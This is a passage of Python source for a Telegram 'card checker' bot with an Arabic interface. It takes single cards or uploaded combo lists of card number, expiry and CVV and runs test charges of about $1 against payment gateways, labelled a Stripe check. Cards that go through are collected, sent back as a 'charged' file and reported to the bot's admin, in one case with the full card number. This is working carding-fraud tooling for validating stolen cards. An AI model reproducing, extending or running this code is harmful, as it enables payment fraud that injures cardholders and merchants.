@bot.callback_query_handler(func=lambda call: call.data == 'check_sub')
def check_subscription(call):
    # Auto-success for manual check button if it still exists
    bot.answer_callback_query(call.id, "✅ تم التحقق، أهلاً بك!")
    bot.delete_message(call.message.chat.id, call.message.message_id)
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'free_info')
def show_free_info(call):
    try:
        msg = f"{BTN_DIAMOND} <b>البوت مجاني بالكامل</b>\n\n{BTN_STAR} لا يوجد نظام نقاط\n{BTN_FIRE} فحص غير محدود\n{BTN_CARD} نظام Levels وترتيب\n\n{BTN_BOLT} ارسل /cmds للأوامر"
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, msg, parse_mode='HTML')
    except:
        bot.send_message(call.message.chat.id, "💎 البوت مجاني بالكامل - استمتع!")

@bot.message_handler(commands=["broadcast", "bc"])
def broadcast_command(message):
    if not is_admin(message.from_user.id):
        return
    msg = bot.reply_to(message, f"{BTN_ADD} قم بإرسال الرسالة التي تريد إذاعتها")
    bot.register_next_step_handler(msg, process_broadcast)

def process_broadcast(message):
    if not is_admin(message.from_user.id):
        return
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        users = [int(k) for k in data.keys() if k.isdigit()]
    except:
        bot.reply_to(message, f"{BTN_WARN} خطأ في قراءة قاعدة البيانات")
        return
    success = 0
    failed = 0
    status_msg = bot.reply_to(message, f"{BTN_CLOCK} جارٍ الإذاعة...\n✅ نجح: {success}\n❌ فشل: {failed}")
    for user_id in users:
        if is_banned(user_id):
            continue
        try:
            if message.content_type == 'text':
                bot.send_message(user_id, message.text, parse_mode='HTML')
            elif message.content_type == 'photo':
                bot.send_photo(user_id, message.photo[-1].file_id, caption=message.caption or "", parse_mode='HTML')
            elif message.content_type == 'video':
                bot.send_video(user_id, message.video.file_id, caption=message.caption or "", parse_mode='HTML')
            else:
                bot.forward_message(user_id, message.chat.id, message.message_id)
            success += 1
        except:
            failed += 1
        if (success + failed) % 10 == 0:
            try:
                bot.edit_message_text(f"{BTN_CLOCK} جارٍ الإذاعة...\n✅ نجح: {success}\n❌ فشل: {failed}", status_msg.chat.id, status_msg.message_id)
            except:
                pass
        time.sleep(0.05)
    bot.edit_message_text(f"{BTN_CHECK} اكتملت الإذاعة!\n\n✅ نجح: {success}\n❌ فشل: {failed}\n📊 الإجمالي: {success + failed}", status_msg.chat.id, status_msg.message_id)

@bot.message_handler(commands=["help"])
def help_command(message):
    if is_banned(message.from_user.id):
        return
    try:
        msg_text = f"""{BTN_LIST} <b>Bot Commands:</b>

{BTN_BOLT} /chk - فحص بطاقة
{BTN_CARD} /info [bin] - فحص BIN
{BTN_STAR} /fake - توليد معلومات
{BTN_FIRE} /top - ترتيب المستخدمين
{BTN_DIAMOND} البوت مجاني بالكامل
{BTN_CROWN} البوابات: {len(GATEWAYS)}"""
        bot.send_message(chat_id=message.chat.id, text=msg_text, parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, "📋 /chk - /info - /top - /fake")

# ==================== STRIPE CHECK ====================
@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/chk') or m.text.lower().startswith('.chk')) and not (m.text.lower().startswith('/chk ') or m.text.lower().startswith('.chk ')))
def stripe_check_noarg(message):
    if is_banned(message.from_user.id):
        return
    # Subscription check removed
    bot.reply_to(message, f"{_L} Please enter the card\n{_L} Example: /chk 4xxxxx|12|2030|123", parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text and (m.text.lower().startswith('/chk ') or m.text.lower().startswith('.chk ')))
def stripe_check_command(message):
    global free_mode
    if is_banned(message.from_user.id):
        return
    if not free_mode:
        bot.reply_to(message, "⛔ الفحص متوقف حالياً، جرب لاحقاً")
        return
    # Subscription check removed
    if is_spam(message.from_user.id):
        bot.reply_to(message, "⏳ انتظر قليلاً قبل الفحص التالي (حد أقصى 5 فحوصات في الدقيقة)")
        return
    def stripe_thread():
        idt = message.from_user.id
        name = message.from_user.first_name
        try:
            command_usage[idt]['last_time']
        except:
            command_usage[idt] = {'last_time': datetime.now()}
        current_time = datetime.now()
        if command_usage[idt]['last_time'] is not None:
            time_diff = (current_time - command_usage[idt]['last_time']).seconds
            if time_diff < 1:
                bot.reply_to(message, f"انتظر {10-time_diff} ثانية")
                return
        ko = bot.reply_to(message, f"{_L} Checking...", parse_mode='HTML').message_id
        try:
            cc_raw = message.reply_to_message.text if message.reply_to_message else message.text
        except:
            cc_raw = message.text
        cc = str(reg(cc_raw))
        if cc == 'None':
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"{_L} Status: Invalid Format!\n{_L} Correct Format: /chk 4xxxxx|12|2030|123", parse_mode='HTML')
            return
        selected_gateway = random.choice(GATEWAYS)
        start_time = time.time()
        command_usage[idt]['last_time'] = datetime.now()
        form_data = extract_data(selected_gateway)
        if not form_data:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"{_L} ❌ Failed to extract data from {selected_gateway['display_name']}", parse_mode='HTML')
            return
        res = check_card_on_gateway(cc, selected_gateway, form_data)
        info = dato(cc[:6])
        execution_time = time.time() - start_time
        category = 'charged' if res['charged'] else 'declined'
        checks, old_level, new_level = increment_checks(message.from_user.id)
        level_up = (new_level > old_level)
        save_log(cc, "CHARGED" if category == 'charged' else "DECLINED", name, selected_gateway['display_name'])
        if category == 'charged':
            card_type_name, card_emoji = detect_card_type(cc[:6])
            try:
                bot.send_message(
                    ADMIN_ID,
                    f"🟢 <b>CHARGED!</b>\n\n"
                    f"👤 User: {name} (<code>{message.from_user.id}</code>)\n"
                    f"🌐 Gate: {selected_gateway['display_name']}\n"
                    f"💰 Amount: $1\n"
                    f"📋 Response: {res['message']}",
                    parse_mode='HTML'
                )
            except:
                pass
        send_check_result(message.chat.id, ko, cc, category, res['message'], info, execution_time, name, selected_gateway['display_name'], "1")
        if level_up:
            title = get_level_title(new_level)
            try:
                bot.send_message(
                    message.chat.id,
                    f"🎉 <b>مبروك!</b> وصلت إلى <b>Level {new_level}</b> - {title}\nإجمالي فحوصاتك: {checks}",
                    parse_mode='HTML'
                )
            except:
                pass
    threading.Thread(target=stripe_thread).start()

# ==================== FILE CHECK ====================
@bot.message_handler(content_types=["document"])
def handle_document(message):
    global free_mode
    if is_banned(message.from_user.id):
        return
    if not free_mode:
        bot.reply_to(message, "⛔ الفحص متوقف حالياً، جرب لاحقاً")
        return
    # Subscription check removed
    user_id = message.from_user.id
    if user_id in active_scans:
        bot.reply_to(message, f"{BTN_WARN} ما تقدر تفحص اكثر من ملف بنفس الوقت")
        return
    active_scans.add(user_id)
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for gw in GATEWAYS:
        keyboard.add(types.InlineKeyboardButton(f"{gw.get('icon', '💳')} {gw['display_name']}", callback_data=f'gate_{gw["name"]}'))
    keyboard.add(types.InlineKeyboardButton(f"{BTN_RANDOM} فحص عشوائي", callback_data='gate_random'))
    bot.reply_to(message, text=f'{BTN_LIST} اختر البوابة للفحص:', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'gate_random')
def process_random_file(call):
    def random_file_thread():
        id = call.from_user.id
        user_id = call.from_user.id
        name = call.from_user.first_name
        with open("combo.txt", 'r') as file:
            cards = [line.strip() for line in file if '|' in line and line.strip()]
        total = len(cards)
        if total == 0:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{BTN_WARN} لا توجد بطاقات صالحة!")
            if user_id in active_scans:
                active_scans.remove(user_id)
            if os.path.exists("combo.txt"):
                os.remove("combo.txt")
            return
        dd = 0
        live = 0
        cards_checked = 0
        charged_cards = []
        scan_start = time.time()
        status_msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{BTN_CLOCK} جارٍ الفحص العشوائي...\n📁 البطاقات: {total}", parse_mode='HTML')
        try:
            stopuser[f'{id}'] = {'status': 'start'}
            for card in cards:
                if stopuser[f'{id}']['status'] == 'stop':
                    break
                selected_gateway = random.choice(GATEWAYS)
                info = dato(card[:6])
                start_time = time.time()
                form_data = extract_data(selected_gateway)
                if not form_data:
                    raw_response = "Failed to extract data"
                    category = 'declined'
                else:
                    res = check_card_on_gateway(card, selected_gateway, form_data)
                    raw_response = res['message']
                    category = 'charged' if res['charged'] else 'declined'
                cards_checked += 1
                if category == 'charged':
                    live += 1
                    charged_cards.append(card)
                else:
                    dd += 1
                increment_checks(user_id)
                save_log(card, "CHARGED" if category == 'charged' else "DECLINED", name, selected_gateway['display_name'])
                if category == 'charged':
                    card_type_name, card_emoji = detect_card_type(card[:6])
                    try:
                        bot.send_message(
                            ADMIN_ID,
                            f"🟢 <b>CHARGED!</b>\n\n"
                            f"👤 User: {name} (<code>{user_id}</code>)\n"
                            f"💳 Card: <code>{card}</code>\n"
                            f"🔍 Type: {card_emoji} {card_type_name}\n"
                            f"🌐 Gate: {selected_gateway['display_name']}\n"
                            f"💰 Amount: $1",
                            parse_mode='HTML'
                        )
                    except:
                        pass
                pct = (cards_checked / total) * 100 if total > 0 else 0
                filled = int(15 * cards_checked // total) if total > 0 else 0
                bar = '▰' * filled + '▱' * (15 - filled)
                elapsed = time.time() - scan_start
                avg = (elapsed / cards_checked) if cards_checked > 0 else 0
                eta = avg * (total - cards_checked)
                dash_text = f"Gate: {selected_gateway['display_name']}\n--------------------\n[{bar}] {pct:.1f}%\n--------------------\nETA: {eta:.0f}s | Elapsed: {elapsed:.0f}s\nBot By @F_S_G"
                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(text=f"• {card[:20]}... •", callback_data='u8'),
                    types.InlineKeyboardButton(text=f"Status: {'Charged' if category=='charged' else 'Declined'}", callback_data='u8'),
                    types.InlineKeyboardButton(text=f"Response: {raw_response[:30]}", callback_data='u8')
                )
                mes.row(
                    types.InlineKeyboardButton(text=f"Charged >> [ {live} ]", callback_data='x'),
                    types.InlineKeyboardButton(text=f"Declined >> [ {dd} ]", callback_data='x')
                )
                mes.add(types.InlineKeyboardButton(text=f"{BTN_STOP} Stop", callback_data='stop'))
                try:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=status_msg.message_id, text=dash_text, reply_markup=mes)
                except:
                    pass
                execution_time = time.time() - start_time
                if category == 'charged':
                    msg_premium, msg_fallback = format_check_msg(card, category, raw_response, info, execution_time, name, selected_gateway['display_name'], "1")
                    try:
                        bot.send_message(call.from_user.id, msg_premium, parse_mode='HTML', disable_web_page_preview=False)
                    except:
                        try:
                            bot.send_message(call.from_user.id, msg_fallback, parse_mode='HTML', disable_web_page_preview=False)
                        except:
                            pass
                time.sleep(0.05)
        except Exception as e:
            print(e)
        finally:
            if user_id in active_scans:
                active_scans.remove(user_id)
            if os.path.exists("combo.txt"):
                os.remove("combo.txt")
        # Send charged file
        if charged_cards:
            with open("charged.txt", "w") as f:
                f.write("\n".join(charged_cards))
            with open("charged.txt", "rb") as f:
                bot.send_document(call.from_user.id, f, caption=f"⚡ Charged Cards: {len(charged_cards)}\nTotal: {total} | Gate: Random")
            os.remove("charged.txt")
        final_text = f"{BTN_CHECK} Scan Complete\n\n📊 النتائج:\n✅ Charged: {live}\n❌ Declined: {dd}\n📇 Total: {total}\nBot By @F_S_G"
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=status_msg.message_id, text=final_text)
        except:
            bot.send_message(call.from_user.id, final_text)
    threading.Thread(target=random_file_thread).start()

@bot.callback_query_handler(func=lambda call: call.data.startswith('gate_') and call.data != 'gate_random')
def process_combo_gate(call):
    def my_function():
        id = call.from_user.id
        user_id = call.from_user.id
        gate_name = call.data[5:]
        selected_gateway = None
        for gw in GATEWAYS:
            if gw['name'] == gate_name:
                selected_gateway = gw
                break
        if not selected_gateway:
            bot.answer_callback_query(call.id, "بوابة غير موجودة!")
            return
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
        dd = 0
        live = 0
        cards_checked = 0
        charged_cards = []
        scan_start = time.time()
        status_msg = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{BTN_CLOCK} جارٍ الفحص على {selected_gateway['display_name']}...")
        try:
            stopuser[f'{id}'] = {'status': 'start'}
            for cc in lino:
                if stopuser[f'{id}']['status'] == 'stop':
                    break
                cc_clean = cc.strip()
                if '|' not in cc_clean:
                    continue
                info = dato(cc_clean[:6])
                start_time = time.time()
                form_data = extract_data(selected_gateway)
                if not form_data:
                    raw_response = "Failed to extract data"
                    category = 'declined'
                else:
                    res = check_card_on_gateway(cc_clean, selected_gateway, form_data)
                    raw_response = res['message']
                    category = 'charged' if res['charged'] else 'declined'
                cards_checked += 1
                if category == 'charged':
                    live += 1
                    charged_cards.append(cc_clean)
                else:
                    dd += 1
                increment_checks(user_id)
                save_log(cc_clean, "CHARGED" if category == 'charged' else "DECLINED", call.from_user.first_name, selected_gateway['display_name'])
                if category == 'charged':
                    card_type_name, card_emoji = detect_card_type(cc_clean[:6])
                    try:
                        bot.send_message(
                            ADMIN_ID,
                            f"🟢 <b>CHARGED!</b>\n\n"
                            f"👤 User: {call.from_user.first_name} (<code>{user_id}</code>)\n"
                            f"🌐 Gate: {selected_gateway['display_name']}\n"
                            f"💰 Amount: $1",
                            parse_mode='HTML'
                        )
                    except:
                        pass
                pct = (cards_checked / total) * 100 if total > 0 else 0
                filled = int(15 * cards_checked // total) if total > 0 else 0
                bar = '▰' * filled + '▱' * (15 - filled)
                elapsed = time.time() - scan_start
                avg = (elapsed / cards_checked) if cards_checked > 0 else 0
                eta = avg * (total - cards_checked)
                dash_text = f"Gate: {selected_gateway['display_name']}\n--------------------\n[{bar}] {pct:.1f}%\n--------------------\nETA: {eta:.0f}s | Elapsed: {elapsed:.0f}s\nBot By @F_S_G"
                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(text=f"• {cc_clean[:20]}... •", callback_data='u8'),
                    types.InlineKeyboardButton(text=f"Status: {'Charged' if category=='charged' else 'Declined'}", callback_data='u8')
                )
                mes.row(
                    types.InlineKeyboardButton(text=f"Charged >> [ {live} ]", callback_data='x'),
                    types.InlineKeyboardButton(text=f"Declined >> [ {dd} ]", callback_data='x')
                )
                mes.add(types.InlineKeyboardButton(text=f"{BTN_STOP} Stop", callback_data='stop'))
                try:
                    bot.edit_message_text(chat_id=call.message.chat.id, message_id=status_msg.message_id, text=dash_text, reply_markup=mes)
                except:
                    pass
                execution_time = time.time() - start_time
                if category == 'charged':
                    msg_premium, msg_fallback = format_check_msg(cc_clean, category, raw_response, info, execution_time, call.from_user.first_name, selected_gateway['display_name'], "1")
                    try:
                        bot.send_message(call.from_user.id, msg_premium, parse_mode='HTML')
                    except:
                        try:
                            bot.send_message(call.from_user.id, msg_fallback, parse_mode='HTML')
                        except:
                            pass
                time.sleep(0.05)
        except Exception as e:
            print(e)
        finally:
            if user_id in active_scans:
                active_scans.remove(user_id)
            if os.path.exists("combo.txt"):
                os.remove("combo.txt")
        # Send charged file
        if charged_cards:
            with open("charged.txt", "w") as f:
                f.write("\n".join(charged_cards))
            with open("charged.txt", "rb") as f:
                bot.send_document(call.from_user.id, f, caption=f"⚡ Charged Cards: {len(charged_cards)}\nTotal: {total} | Gate: {selected_gateway['display_name']}")
            os.remove("charged.txt")
        final_text = f"{BTN_CHECK} Scan Complete\n\n📊 النتائج:\n✅ Charged: {live}\n❌ Declined: {dd}\n📇 Total: {total}\nBot By @F_S_G"
        try:
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=status_msg.message_id, text=final_text)
        except:
            bot.send_message(call.from_user.id, final_text)
    threading.Thread(target=my_function).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    bot.answer_callback_query(call.id, "تم إيقاف الفحص")

@bot.callback_query_handler(func=lambda call: call.data in ['u8', 'x'])
def dummy_callback(call):
    bot.answer_callback_query(call.id)

# ==================== MAIN ====================
if __name__ == "__main__":
    initialize_data_file()
    if not os.path.exists('admins.json'):
        save_admins([ADMIN_ID])
    print(f"{BTN_CHECK} Bot Started {BTN_BOT}")
    print(f"{BTN_CROWN} Bot By @F_S_G")
    print(f"{BTN_CARD} Gateways: {len(GATEWAYS)}")
    print(f"{BTN_BOLT} Free + Levels + Admin System + Gate Management + Speed Mode")
    try:
        bot.send_message(ADMIN_ID, "🟢 Bot Started Successfully!")
    except:
        pass
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"{BTN_WARN} Error: {e}")
            time.sleep(5)
